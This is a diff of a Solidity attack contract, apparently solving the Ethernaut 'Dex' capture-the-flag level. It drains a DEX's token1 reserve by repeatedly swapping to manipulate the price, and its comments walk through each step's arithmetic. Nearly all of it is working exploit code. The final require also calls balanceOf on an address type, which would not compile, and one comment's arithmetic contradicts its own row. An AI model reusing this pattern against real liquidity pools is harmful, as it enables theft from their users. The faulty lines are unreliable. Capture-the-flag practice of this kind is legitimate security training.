@@ -31,72 +31,52 @@ interface IDex {
     ) external view returns (uint256);
 }
 
-interface ISwappable {
-    function approve(address owner, address spender, uint256 amount) external;
-}
+/*
+ * 0. Approve the newly deployed contract to transfer token1 & token2
+ * --------------------------------------------------------------------
+ * await contract.approve("0x63756907c4b701acE7B29E3Fc8cCaFF5fd98b54e", "100000000000000000000");
+ */
 
 contract Ethernaut_Dex {
-    IDex idex = IDex(0x70706267094360043049CA21bAeB5c96FB418e56);
-    address token1 = idex.token1();
-    address token2 = idex.token2();
-
-    uint256 initialAmount = 9;
+    IDex private idex = IDex(0x98E7fF2DfFF412D7E9e03A51AE0f63f9e983C3cE);
+    address private immutable token1 = idex.token1();
+    address private immutable token2 = idex.token2();
 
     function attack() public {
-        ISwappable(token1).approve(
-            msg.sender,
-            address(this),
-            type(uint256).max
-        );
-        IERC20(token1).transferFrom(
-            msg.sender,
-            address(this),
-            idex.balanceOf(token1, msg.sender)
-        );
+        // 2. Transfer all tokens to the contract (!!! Require approval for this to work !!!)
+        IERC20(token1).transferFrom(msg.sender, address(this), 10);
+        IERC20(token2).transferFrom(msg.sender, address(this), 10);
 
-        // 1. Do a big swap to move the price to an extreme
-        swap1For2(initialAmount);
-        initialAmount = idex.balanceOf(token2, msg.sender);
+        // 3. Swap the tokens multiple times to profit from the "artificial" price
+        idex.approve(address(idex), type(uint256).max);
+        _swap(token1, token2); // 10 in | 100 - 100 | 10 out (10*100/100 = 10)
+        _swap(token2, token1); // 20 in | 110 - 90  | 24 out (20*110/90 = 24)
+        _swap(token1, token2); // 24 in | 86  - 110 | 30 out (24*110/86 = 30)
+        _swap(token2, token1); // 30 in | 110  - 80 | 41 out (30*110/80 = 41)
+        _swap(token1, token2); // 41 in | 69  - 110 | 65 out (41*110/67 = 65)
 
-        // 2. Do the opposite swap to profit from the "artificial" price
-        swap2For1(initialAmount);
-        IERC20(token1).transferFrom(
-            address(this),
+        // 4. Swap with the exact amount to empty the reserves of token1
+        // Final swap:
+        // x in | 110 - 45 | 110 out (x*110/45 = 110)
+        // x = 110*45/110 = 45
+        idex.swap(token2, token1, 45);
+
+        // 5. Transfer tokens back
+        IERC20(token1).transfer(
+            msg.sender,
+            idex.balanceOf(token1, address(this))
+        );
+        IERC20(token2).transfer(
             msg.sender,
             idex.balanceOf(token2, address(this))
         );
+
+        require(token1.balanceOf(address(idex)) == 0, "Attack failed!");
     }
 
-    function getPrice() public view returns (uint256, uint256) {
-        uint256 currentPrice1 = idex.getSwapPrice(
-            token1,
-            token2,
-            initialAmount
-        );
-        uint256 currentPrice2 = idex.getSwapPrice(
-            token2,
-            token1,
-            initialAmount
-        );
-
-        return (currentPrice1, currentPrice2);
-    }
-
-    function getBalance() public view returns (uint256, uint256) {
-        uint256 bal1 = idex.balanceOf(token1, msg.sender);
-        uint256 bal2 = idex.balanceOf(token2, msg.sender);
-
-        return (bal1, bal2);
-    }
-
-    function swap1For2(uint256 _amount) public {
-        idex.approve(address(idex), type(uint256).max);
-        idex.swap(token1, token2, _amount);
-    }
-
-    function swap2For1(uint256 _amount) public {
-        idex.approve(address(idex), type(uint256).max);
-        idex.swap(token2, token1, _amount);
+    function _swap(address tokenIn, address tokenOut) private {
+        uint256 amount = idex.balanceOf(tokenIn, address(this));
+        idex.swap(tokenIn, tokenOut, amount);
     }
 }
 
